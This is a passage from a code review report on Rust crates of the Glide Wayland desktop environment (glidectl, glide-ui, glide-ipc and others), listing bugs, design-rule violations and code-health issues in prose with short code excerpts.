   - **Description**: In `tests/pam.rs`, `module()` attempts to resolve `libpam_glide_keychain.so` from `target/debug/`. If the shared object has not been built prior to running `cargo test --test pam`, `module()` returns `None`, and both tests (`a_login_leaves_the_stretched_password_...` and `a_login_without_a_password_...`) return early with `Ok(())`. Cargo reports the tests as passing without executing a single assertion. When module discovery fails, the tests should fail via `panic!` or record explicit failure rather than silently succeeding.
5. **Zero test coverage for `pam_sm_chauthtok`, `pam_sm_setcred`, and `pam_sm_close_session`**
   - **Location**: `crates/glide-pam/src/lib.rs:188-227` and `crates/glide-pam/tests/pam.rs:1-159`
   - **Description**: While `pam_sm_authenticate` and `pam_sm_open_session` are exercised by integration tests, the password rotation logic in `pam_sm_chauthtok` (generating `REKEY_FILE`), `pam_sm_setcred`, and `pam_sm_close_session` contain zero unit or integration test coverage across the workspace. Regressions in rekey serialization or flag filtering (`PAM_PRELIM_CHECK`) would go undetected by CI test runs.
6. **Relative path vulnerability in `XDG_RUNTIME_DIR` resolution**
   - **Location**: `crates/glide-pam/src/lib.rs:105-116`
   - **Description**: In `runtime_dir()`, the value of `XDG_RUNTIME_DIR` obtained via `pam_getenv` is accepted if `!dir.is_empty()`, but is not validated with `Path::new(dir).is_absolute()`. Per the XDG Base Directory Specification, `XDG_RUNTIME_DIR` must strictly be an absolute path. Accepting a relative path allows file lookups and creations to occur relative to the PAM host process's current working directory, potentially bypassing directory ownership invariants if a matching directory exists in the working directory.
7. **Unverified user identity matching between authentication and session phases**
   - **Location**: `crates/glide-pam/src/lib.rs:86-103, 196-203`
   - **Description**: `remember()` stores only `WrappingKey` in PAM module data without recording the `Account` or UID for which the key was authenticated. If a complex PAM configuration or identity-mapping module modifies `PAM_USER` between `pam_sm_authenticate` and `pam_sm_open_session` (e.g. switching from an unprivileged user to a target user or role), `pam_sm_open_session` will write the authenticated user's wrapping key into the new user's runtime folder. Associating the target UID with the stored data and asserting identity equivalence in `pam_sm_open_session` would prevent cross-account key pollution.

---

### 5. `glidectl` (484 lines)

#### Summary
`glidectl` is the official command-line control and inspection utility for the Glide Wayland compositor, located at `crates/glidectl`. It communicates with the compositor over a local Unix domain socket (`glide_ipc`) to query status (workspaces, windows, outputs, idle inhibitors, keyboard layout), execute control commands (focusing windows, switching workspaces, moving windows, toggling DPMS, cycling keyboard layouts, executing shell commands, reloading configuration, locking the screen), and stream real-time window/focus/workspace events (`glidectl subscribe`). It also serves as the CLI interface to query and print Meridian design system tokens as JSON (`glidectl tokens [light|dark] [ACCENT]`), implementing the design token export specified in `AGENTS.md` § 8.

The codebase is written in 100% safe Rust without `unsafe` blocks. It adheres strictly to `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glidectl`, `cargo clippy -p glidectl --all-targets -- -D warnings`, and all unit tests pass cleanly (`cargo test -p glidectl`). However, deep review revealed 4 Bugs, 1 AGENTS.md Trap violation, and 7 Code Health issues relating to argument quoting disparities, unbounded memory allocation during event streaming, connection timeout hazards, broken pipe crashes, dead response handling, and fragile table formatting.

#### Findings

##### Critical
None identified.

##### Bug
1. **Quoting semantic disparity in `exec_command` alters execution semantics based on argument count**
   - **Location**: `crates/glidectl/src/main.rs:219-224`
   - **Description**: In `exec_command()`, argument handling diverges based on word count:
     ```rust
     match words {
         [single] => single.clone(),
         many => many.iter().map(|word| shell_quote(word)).collect::<Vec<_>>().join(" "),
     }
     ```
     When invoked with a single argument containing whitespace (e.g. `glidectl exec "/path/with spaces/script.sh"` or `glidectl exec "notify-send 'hello world'"`), the single argument is passed to the compositor completely raw and unquoted. When the compositor passes this command to `sh -c`, the shell word-splits `/path/with` and `spaces/script.sh`, causing execution to fail with `No such file or directory`. Conversely, if two arguments are supplied (e.g. `glidectl exec "/path/with spaces/script.sh" "arg"`), the `many` arm is taken, properly shell-quoting each argument (`'/path/with spaces/script.sh' arg`). This makes execution behavior unpredictable and sensitive to whether the caller passed a single aggregated string or multiple words.
2. **Unbounded memory allocation in `run_subscribe` event reader**
   - **Location**: `crates/glidectl/src/main.rs:130-138`
   - **Description**: While `exchange()` safely constrains response reads using `std::io::Read::take(&mut reader, glide_ipc::client::MAX_RESPONSE_BYTES)`, `run_subscribe()` calls `reader.read_line(&mut line)?` directly in a loop without any buffer length bound. If the compositor malfunctions, is compromised, or streams continuous bytes without a newline delimiter (`\n`), `read_line` will allocate heap memory without bound until the process is killed by the kernel OOM killer.
3. **Misleading JSON EOF syntax error instead of connection error on empty server response**
   - **Location**: `crates/glidectl/src/main.rs:114-116`
   - **Description**: In `exchange()`, `read_line(&mut line)?` reads the single-line JSON response. If the compositor crashes, closes the Unix socket, or terminates before sending a response, `read_line` returns `Ok(0)` (EOF), leaving `line` as `""`. `serde_json::from_str(&line)?` is then called on the empty string, causing `glidectl` to exit with an obscure syntax error: `Error: EOF while parsing a value at line 1 column 0`. The function should verify that `bytes_read > 0` and return an explicit error (e.g. `anyhow::bail!("Compositor closed connection without sending a response")`).
4. **Unhandled BrokenPipe panics when piping stdout to consuming processes**
   - **Location**: `crates/glidectl/src/main.rs:68, 70, 149, 151, 302-364`
   - **Description**: `glidectl` is designed for shell scripting and pipelines (e.g. `glidectl subscribe | head -n 1`, `glidectl outputs | head -n 2`, `glidectl window list | grep -i terminal`). When a downstream reader exits early, subsequent writes to stdout via `println!` trigger Rust's default standard library panic (`failed printing to stdout: Broken pipe`). CLI utilities should handle `ErrorKind::BrokenPipe` gracefully and exit cleanly with code 0 instead of aborting with a panic.

##### AGENTS.md Trap
1. **Unbounded blocking in `UnixStream::connect` can hang the CLI indefinitely (`AGENTS.md` § 7)**
   - **Location**: `crates/glidectl/src/main.rs:99-104`
   - **Description**: `AGENTS.md` § 7 warns against *"Blocking the event loop"* and unbounded blocking on IPC calls. `connect()` configures a 10-second `IO_TIMEOUT` on read and write operations, but only *after* the socket stream is already connected:
     ```rust
     let stream = UnixStream::connect(socket_path)?;
     stream.set_read_timeout(Some(IO_TIMEOUT))?;
     stream.set_write_timeout(Some(IO_TIMEOUT))?;
     ```
     `UnixStream::connect(socket_path)` itself is a synchronous blocking system call with no timeout. If the compositor's main thread is deadlocked, hung on a DRM/libinput lock, or frozen in an infinite loop, its socket backlog stops accepting connections. Any invocation of `glidectl` (including `ping` or `quit`) will block indefinitely inside the kernel in `connect()`, hanging user terminal sessions, scripts, and health monitors without ever reaching the 10-second `IO_TIMEOUT`.

##### Code Health
1. **Missing standard `--help` and `-h` CLI flag handling**
   - **Location**: `crates/glidectl/src/main.rs:18-38, 45-51, 280`
   - **Description**: Running `glidectl --help` or `glidectl -h` is not intercepted by `parse_cli_args()`. Instead, `--help` is placed into `subcommand_args`, passed to `parse_args()`, and rejected by the fallback arm (line 280) with `Error: Unknown command: --help` and exit code 1. Standard CLI utilities should recognize `--help` / `-h`, print the `USAGE` text to stdout, and exit with status 0.
2. **Incomplete `--json` argument removal when duplicate or redundant flags are passed**
   - **Location**: `crates/glidectl/src/main.rs:30-35`
   - **Description**: In `parse_cli_args()`, trailing `--json` stripping in `subcommand_args` only searches for the first occurrence using `position(|a| a == "--json")` and removes it once via `remove(pos)`. If `--json` is supplied more than once (e.g. `glidectl workspace list --json --json`), the subsequent `--json` remains in `subcommand_args`, causing downstream subcommand parsers to fail. Using `subcommand_args.retain(|a| a != "--json")` would ensure all occurrences are cleanly removed.
3. **Dead response formatting branches in `print_response`**
   - **Location**: `crates/glidectl/src/main.rs:313-320`
   - **Description**: `print_response` includes formatting logic for `Response::ActivationToken`, `Response::Screenshot`, `Response::Color`, and `Response::QrCodes`. However, `glidectl`'s argument parser (`parse_args`) contains no subcommands to request `activation-token`, `screenshot`, `screenshot-area`, `pick-color`, or `scan-qr`. These response branches are dead code within `glidectl`.
4. **Fragile table column formatting without width truncation or newline sanitization**
   - **Location**: `crates/glidectl/src/main.rs:345-362`
   - **Description**: In `Response::Windows`, window titles and application IDs are printed using `"{:<6} {:<15} {:<10} {:<25} {:<8} {:<9}"`. If a title or app ID exceeds 15 or 25 characters, Rust's format padding does not truncate the field, causing all subsequent columns (`FOCUSED`, `MINIMIZED`) to shift out of alignment. Furthermore, if a client window sets a title containing embedded newline characters (`\n`), the table output is broken across multiple lines without sanitization.
5. **Non-idiomatic `&PathBuf` parameter types in private functions**
   - **Location**: `crates/glidectl/src/main.rs:99, 106, 119`
   - **Description**: Functions `connect(socket_path: &PathBuf)`, `exchange(socket_path: &PathBuf, ...)`, and `run_subscribe(socket_path: &PathBuf, ...)` take `&PathBuf` instead of the idiomatic borrowed slice `&std::path::Path`.
6. **Unchecked integer increment on workspace indexes (`ws.index + 1`)**
   - **Location**: `crates/glidectl/src/main.rs:342, 356`
   - **Description**: Table formatters convert 0-indexed internal workspace indices to 1-indexed user display values using `ws.index + 1` and `w.workspace_index + 1`. In the event of corrupt IPC data or `usize::MAX` values, unguarded addition will overflow (panicking in debug mode). Using `.saturating_add(1)` provides defense-in-depth against arithmetic overflow.
7. **Redundant string allocation in `parse_workspace_target`**
   - **Location**: `crates/glidectl/src/main.rs:289`
   - **Description**: `parse_workspace_target` calls `s.to_lowercase()`, allocating an unnecessary heap `String` on every invocation to compare against `"next"`, `"prev"`, and `"previous"`. Using `s.eq_ignore_ascii_case("next")` or `match s` with case-insensitive checks avoids heap allocation.

---

### 6. `glide-ui` (520 lines)

#### Summary
`glide-ui` is a foundational animation and widget transition primitive crate for the Glide desktop environment, located at `crates/glide-ui`. It defines three core state machines that drive animations across the compositor shell and UI ecosystem (`glide-compositor`, `glide-dock`, `glide-topbar`, `glide-launcher`, `glide-overlays`, `glide-shot`, `glide-greeter`, `glide-iced`, `glide-sdk`):
1. `HoverAnimation<T>`: tracks pointer hover state across discrete item targets (`target`, `rise_from`, `outgoing`), facilitating smooth opacity crossfades between hovered and previously hovered items or resting states.
2. `Reveal`: manages two-state open/close visibility transitions across four explicit phases (`Closed`, `Opening`, `Open`, `Closing`), providing continuous mid-transition reversal without position snapping and reporting visibility/animation status.
3. `Tween`: interpolates scalar `f64` properties (coordinates, scale, opacity, dimensions) from a starting value to a dynamic target over a configured duration using configurable easing functions, with seamless in-flight retargeting.

The codebase is written in 100% safe Rust with 0 `unsafe` blocks and zero dependencies. It adheres strictly to `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glide-ui`, `cargo clippy -p glide-ui --all-targets -- -D warnings`, and all unit tests pass cleanly (`cargo test -p glide-ui` passes 21 tests). Deep review identified 3 Bugs, 1 AGENTS.md Trap violation, and 7 Code Health issues covering reversal visual jump defects, initial-frame visibility suppression, duration evaluation desynchronization, asymmetric ease curve constraints, and state persistence leaks.

#### Findings

##### Critical
None identified.

##### Bug
1. **`Reveal::begin` samples position using default linear ease, inducing visual popping on mid-transition reversal**
   - **Location**: `crates/glide-ui/src/motion.rs:109-114, 61-73`
   - **Description**: In `Reveal::begin()`, the starting progress for a new transition is computed via `self.from = self.value(self.duration)`. `Reveal::value()` forwards to `self.progress(duration, self.ease)`. However, `Reveal` defaults `self.ease` to `linear_ease` (lines 41, 46, 51), while consumers throughout the workspace (e.g. `switcher.rs:412`, `snap.rs:222`, `preview.rs:183`) pass non-linear easing functions (such as `glide_theme::motion::E_OUT` or `ease_out`) directly to `self.reveal.progress(duration, ease)` on every render frame rather than configuring `.with_ease(...)` at construction. When an in-flight opening transition is reversed midway by `close()` (or vice-versa), `begin()` computes `self.from` by sampling `linear_ease` rather than the curve that was drawn on screen. For example, under standard Meridian `E_OUT`, at 30% elapsed duration the element is rendered at ~65% progress. Upon calling `close()`, `self.from` is evaluated using `linear_ease(0.30)`, abruptly snapping `self.from` down to 0.30 on the next frame (a 35% instantaneous visual jump). `Reveal` must allow passing the active easing function during `open()` and `close()` or track the active easing function.
2. **`Reveal::is_visible` returns `false` on the initial frame of opening (`t = 0`)**
   - **Location**: `crates/glide-ui/src/motion.rs:81-83, 131-134`
   - **Description**: `Reveal::is_visible()` is implemented as `self.linear(duration) > 0.0`. When `r = Reveal::closed()` begins opening via `r.open(duration)`, `self.phase` transitions to `Phase::Opening`, `self.from = 0.0`, and `self.started = Instant::now()`. On the initial render frame immediately after opening ($t = 0$), `self.linear(duration)` evaluates `self.from + (1.0 - self.from) * linear_ease(0.0) = 0.0`. Because `0.0 > 0.0` is false, `is_visible()` returns `false` despite `is_open()` and `is_animating()` both being true. Callers relying on `is_visible()` to determine whether to allocate buffers or render elements will skip rendering on the first frame of opening. This defect forced callers (e.g. `glide-dock/src/preview.rs:203`) to write defensive workarounds like `self.reveal.is_open() || self.reveal.is_visible(t2())`. `is_visible` should return `self.is_open() || self.linear(duration) > 0.0`.
3. **Mismatched duration evaluation between `Tween::retarget` and `Tween::value` / `Tween::is_animating`**
   - **Location**: `crates/glide-ui/src/motion.rs:155-164, 174-185`
   - **Description**: `Tween` stores `duration: Duration` as an internal field (`self.duration`). In `Tween::retarget()`, the continuity anchor `self.from` is computed via `self.value(self.duration, ease)`, using the stored duration. However, `Tween::value(&self, duration: Duration, ...)` and `Tween::is_animating(&self, duration: Duration)` also take an external `duration` argument on every invocation. If a consumer passes a dynamic duration (such as `glide_theme::motion::t2()`, which scales dynamically with system animation speed settings) that changes while an animation is in flight, `self.value()` during rendering evaluates progress using the new duration, but `retarget()` samples `self.from` using the stale stored duration `self.duration`. This dual-source-of-truth causes `self.from` to desynchronize from the rendered value upon retargeting. `Tween` should either make `self.duration` the authoritative duration for all queries or parameterize all methods consistently.

##### AGENTS.md Trap
1. **Asymmetric ease curves in `Reveal` violate smooth motion transitions (`AGENTS.md` § 8)**
   - **Location**: `crates/glide-ui/src/motion.rs:66-73, 109-114`
   - **Description**: `AGENTS.md` § 8 mandates: *"Motion carries a transition; opacity only assists. Anything that appears, disappears or is replaced must move, scale or change shape... Curves are E_OUT (primary), E_IO (background properties), E_OVER (overshoot: hover lift, switches)."* Meridian design rules prescribe asymmetric curves for entry (`E_OUT`) versus exit (`E_IO` or `E_OUT`). Because `Reveal` only supports a single `self.ease: Ease` function pointer and provides no mechanism in `open()` or `close()` to specify differing entry and exit curves, consumers must either settle for linear fallbacks in `begin()` or manually coordinate external easing functions. Reversing an opening `E_OUT` with a closing `E_IO` curve produces a discontinuous velocity pop at the reversal point, violating the "Structured Calm" motion continuity invariants of § 8.

##### Code Health
1. **Unbounded lifetime persistence of stale outgoing hover targets in `HoverAnimation`**
   - **Location**: `crates/glide-ui/src/hover.rs:41-48, 74-78, 81-85`
   - **Description**: `HoverAnimation<T>` stores `outgoing: Option<(T, Instant, f64)>` to fade out the previously hovered item. However, `HoverAnimation` provides no `settle()` method, and neither `level()` nor `is_animating()` clears `outgoing` when the fade completes (`fraction >= 1.0`). Consequently, `outgoing` retains the old item `T` and its timestamp indefinitely in memory while the UI is idle. If the referenced item `T` is later removed from the parent collection (e.g. closing a tab, closing a window in dock preview, or removing a workspace), `HoverAnimation` continues to hold stale identifiers and timestamps until another `set()` or `set_with()` call occurs.
2. **Abrupt cancellation of multi-item outgoing hover fades (single outgoing slot limit)**
   - **Location**: `crates/glide-ui/src/hover.rs:45-48`
   - **Description**: `HoverAnimation<T>` maintains only a single `outgoing` slot (`Option<(T, Instant, f64)>`). If the user moves the pointer rapidly across multiple adjacent items (e.g. Item A -> Item B -> Item C), when moving from B to C, Item A's ongoing fade-out in `outgoing` is immediately replaced by Item B (`self.outgoing = Some((old, now, ...))`). Item A instantly snaps from its current fade level down to 0.0 with no smooth fade-out. For high-density item strips (such as dock tiles or overview thumbnails), consumers are forced to bypass `HoverAnimation` or manage separate per-item `Tween` vectors to achieve smooth multi-item hover fades (as seen in `glide-dock`'s `hover_layers`).
3. **`retarget_without_restarting` leaves lingering `falling` animation if re-targeting outgoing item**
   - **Location**: `crates/glide-ui/src/hover.rs:56-58, 83-85`
   - **Description**: In `retarget_without_restarting(&mut self, target: Option<T>)`, the method only executes `self.target = target;` without clearing `self.outgoing`. If `self.outgoing` currently holds `Some((item, left, from))`, and `retarget_without_restarting(Some(item))` is called, both `self.target` and `self.outgoing` hold the same item `item`. While `level(item, duration)` properly prioritizes `self.target`, `is_animating(duration)` continues to evaluate `falling = self.outgoing.is_some_and(...)` as `true` until `fraction(left, duration) >= 1.0`. This keeps UI animation pumps and compositor frame scheduling needlessly active even though the target is already selected.
4. **Missing `Clone` implementation for `HoverAnimation<T>`**
   - **Location**: `crates/glide-ui/src/hover.rs:3-9`
   - **Description**: Unlike `Tween` and `Reveal`, which derive `Clone` and `Copy`, `HoverAnimation<T>` only derives `Debug`. All fields (`Option<T>`, `Option<Instant>`, `f64`, `Option<(T, Instant, f64)>`) are trivially cloneable when `T: Clone`. The absence of `#[derive(Clone)]` on `HoverAnimation` prevents containing structs (such as widget state, menu models, or view descriptors) from deriving `Clone`.
5. **`Ease` type alias is `pub(crate)` despite public method `Reveal::with_ease`**
   - **Location**: `crates/glide-ui/src/motion.rs:11, 55`
   - **Description**: `pub(crate) type Ease = fn(f64) -> f64;` is package-private, but `pub fn with_ease(mut self, ease: Ease) -> Self` is exported publicly on `Reveal`. While Rust allows external callers to pass a function pointer matching `fn(f64) -> f64`, external crates cannot name or document the `Ease` type in signatures or trait bounds.
6. **Missing explicit `settle()` lifecycle method on `HoverAnimation`**
   - **Location**: `crates/glide-ui/src/hover.rs:19-86`
   - **Description**: Unlike `Reveal`, which provides `settle(&mut self, duration: Duration)` to advance finished animations into stable resting phases, `HoverAnimation` lacks a `settle()` method to clear finished outgoing items.
7. **Redundant duration parameter on `Tween::value` and `Tween::is_animating`**
   - **Location**: `crates/glide-ui/src/motion.rs:174, 183`
   - **Description**: `Tween` stores `duration: Duration` internally during `retarget()`, yet `value(&self, duration: Duration, ...)` and `is_animating(&self, duration: Duration)` redundantly require callers to pass `duration` on every invocation. Removing the parameter and utilizing `self.duration` would simplify call sites across the workspace and eliminate duration desynchronization.

---

### 7. `glide-ipc` (942 lines)

#### Summary
`glide-ipc` is the foundational inter-process communication protocol definition and client utility library for the Glide desktop environment, located at `crates/glide-ipc`. It specifies the JSON-over-Unix-socket and stdio message protocols that link the Wayland compositor (`glide-compositor`), the command-line control tool (`glidectl`), the password manager and credential daemon (`glide-keychain`, `glide-passwords`), portal implementations (`glide-portal`), system settings (`glide-settings`), and application SDK clients (`glide-sdk`).

The crate is partitioned into three key modules:
1. `src/lib.rs`: The core compositor IPC message schema, including `Request` (workspaces, windows, layout, screenshots, color picking, QR recognition, activation tokens), `Response`, `Event` broadcast types, and hardware/window topologies (`WorkspaceInfo`, `WindowInfo`, `OutputInfo`, `ModeInfo`, `GestureSample`).
2. `src/client.rs`: Synchronous Unix-socket transport utilities (`socket_path()`, `exchange()`, `activation_token()`, `activation_env()`) providing connection discovery via `GLIDE_IPC_SOCK` / `XDG_RUNTIME_DIR` / `WAYLAND_DISPLAY` and one-shot message exchange.
3. `src/keychain.rs`: The secure credential protocol definition between the compositor and `glide-keychain` child daemon (`Envelope<T>`, `Request`, `Response`, `Vault`, `Detail`, `Summary`, `Draft`, `SecretKind`), along with the memory-zeroizing `Hidden` wrapper and password entropy/strength estimators (`entropy_bits`, `strength`).

The codebase is written in 100% safe Rust with zero `unsafe` blocks and adheres strictly to `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glide-ipc`, `cargo clippy -p glide-ipc --all-targets -- -D warnings`, and all unit tests pass cleanly (`cargo test -p glide-ipc` passes 6 tests). Deep line-by-line inspection identified 5 Bugs, 1 AGENTS.md Trap violation, and 7 Code Health issues covering socket resolution priority inversions, protocol evolution deserialization breakage, password entropy flaws, unhandled socket EOF and payload limits, and un-zeroized credential memory leaks.

#### Findings

##### Critical
None identified.

##### Bug
1. **Silent connection hijacking to host compositor on non-existent `GLIDE_IPC_SOCK`**
   - **Location**: `crates/glide-ipc/src/client.rs:18-21`
   - **Description**: In `socket_path()`, `match named` tests `Some(path) if path.exists() => Some(path)`. If `GLIDE_IPC_SOCK` is explicitly set to an environment-specific or isolated socket path (such as in test environments, nested compositor instances, or container boundaries) and that path does not exist on disk, the match falls through to `named => derived().filter(|path| path.exists()).or(named).or_else(derived)`. If a host Glide compositor is currently running under `$XDG_RUNTIME_DIR/glide-$WAYLAND_DISPLAY.sock`, `derived().filter(|path| path.exists())` succeeds and returns the *host compositor's* socket. The client then silently connects to and executes destructive commands (`Quit`, `Lock`, `Exec`, `SwitchWorkspace`) against the host desktop instead of failing. When `GLIDE_IPC_SOCK` is explicitly specified by the environment, it must be authoritative; falling back to ambient system sockets violates test and session isolation.
2. **Missing `#[serde(other)] Unknown` on `Event` and `keychain::Response` breaks subscribers on protocol evolution**
   - **Location**: `crates/glide-ipc/src/lib.rs:188-200`, `crates/glide-ipc/src/keychain.rs:498-528`
   - **Description**: While `glide_ipc::Response` implements `#[serde(other)] Unknown` (line 184) and includes a unit test ensuring forward compatibility when newer compositors return new variants (line 207), `glide_ipc::Event` (lines 188-200) and `glide_ipc::keychain::Response` (lines 498-528) omit `#[serde(other)] Unknown`. If the compositor introduces new event variants (such as `NightLightChanged`, `ScaleChanged`, `ThemeChanged`, or `DndStarted`) or the keychain daemon emits new responses, existing event subscribers (`glidectl subscribe`, `glide-settings`, `glide-compositor`) fail with JSON deserialization errors and reject or drop the connection.
3. **Flawed password entropy calculation in `entropy_bits` rates repeated single characters as maximum strength**
   - **Location**: `crates/glide-ipc/src/keychain.rs:596-602, 604-618`
   - **Description**: In `entropy_bits()`, character repetition penalty is calculated as `let repeats = chars.len() - distinct.len(); let effective = chars.len() as f64 - repeats as f64 * 0.5; effective.max(1.0) * f64::log2(pool.max(2.0))`. Subtracting only `0.5` per repetition allows `effective` to scale linearly ($0.5 \times N$) for arbitrarily repeated characters. For a password consisting of a single character repeated 38 times (`"a".repeat(38)`), `repeats = 37`, `effective = 19.5`, and `pool = 26`, resulting in $19.5 \times \log_2(26) = 91.65$ bits of entropy. `strength()` rates this password as `4` (the highest possible security rating, requiring $\ge 90$ bits), despite the password containing zero real entropy beyond the initial character selection.
4. **Common password bypass in `entropy_bits` due to rigid `chars.len() < 14` threshold and unsanitized word repeats**
   - **Location**: `crates/glide-ipc/src/keychain.rs:571-579`
   - **Description**: In `entropy_bits`, the dictionary lookup against common passwords is restricted by `if COMMON.iter().any(|common| lower.contains(common)) && chars.len() < 14 { return 10.0; }`. Any password with length $\ge 14$ characters completely bypasses this check. Passwords constructed by concatenating common dictionary patterns (such as `"password123456"` or `"qwerty12345678"`, both 14 characters) evaluate to $> 60$ bits of entropy, receiving a misleading rating of `3` (Strong). Additionally, the passphrase branch (lines 575-579) counts `spelled` words without checking for identical words, scoring repeated words like `"the-the-the"` as 48.7 bits of entropy (Strength 2).
5. **`client::exchange` masks connection EOF as deserialization error and leaves response truncation unhandled**
   - **Location**: `crates/glide-ipc/src/client.rs:34-36`
   - **Description**: In `client::exchange()`, `read_line(&mut line)?` reads the JSON response from the socket. If the compositor crashes, terminates, or closes the connection prematurely without writing, `read_line` returns `Ok(0)` with `line == ""`. The function does not check `if line.is_empty()` to return `std::io::ErrorKind::UnexpectedEof`; instead, it passes `""` to `serde_json::from_str(&line)`, producing a cryptic `io::Error::other("EOF while parsing a value at line 1 column 0")`. Furthermore, if the server response exceeds `MAX_RESPONSE_BYTES` without a newline, `Take` hits its limit and returns `Ok(MAX_RESPONSE_BYTES)` with a truncated buffer, causing a JSON syntax failure instead of reporting that the response payload exceeded the maximum allowed buffer size.

##### AGENTS.md Trap
1. **Unbounded blocking socket connect in client IPC calls violates event loop safety (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-ipc/src/client.rs:24-28, 41-48, 51-55`
   - **Description**: `AGENTS.md` § 7 warns: *"Blocking the event loop. Command::output(), X11 round trips, file reads of client-supplied paths and D-Bus calls belong on a worker thread."* `client::exchange` invokes `UnixStream::connect(path)?` as a blocking synchronous call before configuring socket read and write timeouts (`set_read_timeout` and `set_write_timeout` on lines 27-28 only take effect *after* connection establishment). If the compositor process is frozen, deadlocked, or delayed by a blocking DRM page flip, `UnixStream::connect` blocks synchronously in the kernel indefinitely. Because helper functions `activation_token` and `activation_env` wrap `exchange` without worker thread offloading or non-blocking connect guards, invoking them from client UI threads (e.g. during application launch or menu actions) can freeze the calling application's event loop.

##### Code Health
1. **Plaintext vault export in `Response::Exported` leaks secrets via `Debug` and skips memory zeroization**
   - **Location**: `crates/glide-ipc/src/keychain.rs:521, 498`
   - **Description**: In `glide_ipc::keychain::Response::Exported { data: String, count: u32 }`, `data` contains the entire unencrypted plaintext export of all vault credentials. Because `data` is typed as `String` rather than `Hidden`, it does not zeroize its heap buffer upon drop (`ZeroizeOnDrop`). Furthermore, `Response` derives standard `Debug` without masking `Exported::data`. Any debug logging or tracing (`tracing::debug!(?response)`) of keychain responses outputs the user's entire unencrypted password database to log files or terminal output.
2. **Sensitive credential fields in `Field`, `Detail`, and `TwoFactor` lack memory zeroization**
   - **Location**: `crates/glide-ipc/src/keychain.rs:123-128, 184-196, 326-331`
   - **Description**: In `Field`, `pub value: String` stores arbitrary custom credential fields (such as secret keys, PINs, recovery tokens), but is stored as a raw `String` without `ZeroizeOnDrop`. Similarly, `Detail::notes` is a raw `String` despite frequently containing sensitive account notes and recovery phrases, and `TwoFactor::code` stores 2FA verification tokens as a raw `String`. While `Field` and `TwoFactor` provide custom `Debug` implementations to mask output, their underlying heap strings are deallocated upon drop without zeroization.
3. **Repeated redundant heap allocations in `entropy_bits`**
   - **Location**: `crates/glide-ipc/src/keychain.rs:567-597`
   - **Description**: Every call to `entropy_bits` makes four separate heap allocations: `let chars: Vec<char> = password.chars().collect()`, `let lower = password.to_lowercase()`, `let words: Vec<&str> = password.split(...).collect()`, and `let mut distinct = chars.clone()`. During vault indexing, bulk password auditing (`Report`), or real-time password generator typing, allocating and sorting multiple `Vec` buffers per password creates significant heap churn. Checking ASCII properties and character counts directly over the `&str` slice or an iterator would avoid these allocations.
4. **Missing Wayland display fallback (`wayland-0`) in `socket_path`**
   - **Location**: `crates/glide-ipc/src/client.rs:15-16`
   - **Description**: In `socket_path()`, `derived` fails immediately if `WAYLAND_DISPLAY` is not set: `let display = std::env::var("WAYLAND_DISPLAY").ok().filter(|display| !display.is_empty())?;`. Under the Wayland standard, `wayland-0` is the default display socket name when `WAYLAND_DISPLAY` is unset. If a client daemon or utility is launched in an environment where `WAYLAND_DISPLAY` is not explicitly exported, `socket_path()` fails to detect `glide-wayland-0.sock`.
5. **No `Envelope` constructor or validation against `EVENT` (id = 0)**
   - **Location**: `crates/glide-ipc/src/keychain.rs:531-536`
   - **Description**: `Envelope<T>` exposes public fields `pub id: u64` and `pub body: T`, while defining `pub const EVENT: u64 = 0;`. If a client constructs an envelope with `id: 0`, the keychain daemon or compositor cannot distinguish whether the message is a request/response or an unsolicited event. Providing dedicated constructors (such as `Envelope::request(id, body)` ensuring `id != EVENT`, and `Envelope::event(body)`) would eliminate ambiguous envelope IDs.
6. **Inconsistent request size limits between client and compositor**
   - **Location**: `crates/glide-ipc/src/client.rs:39`
   - **Description**: `client::MAX_RESPONSE_BYTES` is defined as `16 * 1024 * 1024` (16 MiB), whereas `glide-compositor`'s internal `MAX_REQUEST_BYTES` is `64 * 1024` (64 KiB). `glide-ipc` does not export `MAX_REQUEST_BYTES`, preventing clients from knowing the compositor's maximum allowable request size before sending large payloads (such as batch wallpaper requests, custom action parameters, or import data).
7. **Missing `From` / `AsRef` conversion traits on `Hidden`**
   - **Location**: `crates/glide-ipc/src/keychain.rs:10-25`
   - **Description**: `Hidden` only provides `Hidden::new(String)`, `expose(&self) -> &str`, and `is_empty(&self) -> bool`. It lacks standard Rust conversion traits `From<String>`, `From<&str>`, and `AsRef<str>`. This forces callers throughout the workspace to write boilerplate `Hidden::new(s.to_string())` instead of utilizing idiomatic `.into()`.

---

### 8. `glide-notify` (1,050 lines)

#### Summary
`glide-notify` is the implementation of the FreeDesktop Desktop Notifications specification (`org.freedesktop.Notifications`) and KDE notification inhibitions daemon for the Glide desktop environment, located at `crates/glide-notify`. It serves as the bridge between desktop applications emitting D-Bus notification messages and the compositor's notification stack (`glide-topbar/src/notifications.rs` and `glide-compositor/src/state.rs`).

The crate consists of four core modules:
1. `src/lib.rs`: Public re-exports of core notification models (`Notification`, `Action`, `Reply`, `Sound`, `Urgency`, `CloseReason`, `NotifyEvent`) and server primitives (`start`, `NotifyHandle`, `Sink`, `BUS_NAME`).
2. `src/hints.rs`: D-Bus hint dictionary parsing helpers extracting strings, booleans, integer urgency levels, and notification sound specifications (`Sound::None`, `Sound::Named`, `Sound::File`).
3. `src/model.rs`: Core notification data representations, timeout resolution logic based on urgency and wire duration parameters (`resolve_timeout`), body markup sanitizer and plain-text extractor (`sanitize_body`, `plain_text`), action list parsing (`split_actions`), and capability advertisements (`capabilities`).
4. `src/server.rs`: The D-Bus object server (`Service`) serving `org.freedesktop.Notifications` at `/org/freedesktop/Notifications` via `zbus::blocking::Connection`. It manages notification lifecycle (allocation, replacement, revocation, flood detection), D-Bus signal emissions (`NotificationClosed`, `ActionInvoked`, `NotificationReplied`, `ActivationToken`), and application-level Do Not Disturb/inhibition cookies (`inhibit`, `un_inhibit`, `inhibited_changed`) with background client lifetime tracking via D-Bus `NameOwnerChanged`.

The codebase is written in 100% safe Rust with zero `unsafe` blocks, and adheres strictly to `AGENTS.md` § 6 (only comments justifying `#[allow(...)]` attributes are present). `cargo check -p glide-notify`, `cargo clippy -p glide-notify --all-targets -- -D warnings`, and all unit tests pass cleanly (`cargo test -p glide-notify` passes 31 tests). Deep line-by-line inspection identified 4 Bugs, 1 AGENTS.md Trap violation, and 7 Code Health issues covering duplicate flood false rejections, security context masking in inline replies, missing FreeDesktop image hints, unhandled URI decoding in sound file paths, and blocking D-Bus socket writes on the main compositor thread.

#### Findings

##### Critical
None identified.

##### Bug
